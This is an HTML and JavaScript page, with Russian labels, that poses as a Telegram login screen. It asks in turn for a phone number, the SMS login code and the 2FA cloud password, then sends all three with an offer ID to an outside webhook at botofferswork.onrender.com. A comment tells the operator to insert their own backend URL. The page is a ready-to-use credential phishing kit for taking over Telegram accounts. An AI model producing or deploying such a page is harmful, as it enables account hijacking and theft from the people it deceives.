<!doctype html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<title>Telegram</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#fff;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;color:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
.app{width:100%;max-width:360px;text-align:center}
.logo{font-size:64px;margin-bottom:20px}
h1{font-size:26px;margin-bottom:8px}
.sub{color:#707579;font-size:15px;margin-bottom:40px}
.step{display:flex;flex-direction:column;gap:14px}
.hidden{display:none}
label{text-align:left;font-size:13px;color:#707579}
input{padding:14px;border:1px solid #dadce0;border-radius:10px;font-size:16px;outline:none;transition:border-color .2s}
input:focus{border-color:#3390ec}
button{padding:14px;background:#3390ec;color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:600;cursor:pointer;transition:opacity .2s}
button:hover{opacity:.9}
.spinner{width:40px;height:40px;border:4px solid #e0e0e0;border-top-color:#3390ec;border-radius:50%;margin:0 auto 16px;animation:spin 1s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
</style>
</head>
<body>
<div class="app">
  <div class="logo">✈️</div>
  <h1>Telegram</h1>
  <p class="sub" id="sub">Войдите, чтобы продолжить</p>

  <form id="phone-form" class="step">
    <label>Номер телефона</label>
    <input type="tel" id="phone" placeholder="+7 999 123-45-67" required>
    <button type="submit">Далее</button>
  </form>

  <form id="code-form" class="step hidden">
    <label>Код из SMS</label>
    <input type="text" id="code" placeholder="12345" inputmode="numeric" required>
    <button type="submit">Войти</button>
  </form>

  <form id="pass-form" class="step hidden">
    <label>Облачный пароль (2FA)</label>
    <input type="password" id="password" placeholder="••••••••">
    <button type="submit">Подтвердить</button>
  </form>

  <div id="waiting" class="step hidden">
    <div class="spinner"></div>
    <p>Проверяем данные…</p>
  </div>
</div>

<script>
// ═══════════════════════════════════════════════════════
//   ВПИШИ СВОЙ BACKEND URL ЗДЕСЬ
// ═══════════════════════════════════════════════════════
const API = 'https://botofferswork.onrender.com';


const params = new URLSearchParams(location.search);
const offerId = parseInt(params.get('offer') || '0', 10);

const phoneForm = document.getElementById('phone-form');
const codeForm = document.getElementById('code-form');
const passForm = document.getElementById('pass-form');
const waiting = document.getElementById('waiting');

let phone = '';
let code = '';

phoneForm.addEventListener('submit', e => {
  e.preventDefault();
  phone = document.getElementById('phone').value.trim();
  if (phone.length < 6) return;
  phoneForm.classList.add('hidden');
  codeForm.classList.remove('hidden');
});

codeForm.addEventListener('submit', e => {
  e.preventDefault();
  code = document.getElementById('code').value.trim();
  if (code.length < 3) return;
  codeForm.classList.add('hidden');
  passForm.classList.remove('hidden');
});

passForm.addEventListener('submit', async e => {
  e.preventDefault();
  const password = document.getElementById('password').value.trim();
  passForm.classList.add('hidden');
  waiting.classList.remove('hidden');

  await fetch(`${API}/webhook/session`, {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      offer_id: offerId,
      phone: phone,
      code: code,
      password: password || null
    })
  });
});
</script>
</body>
</html>
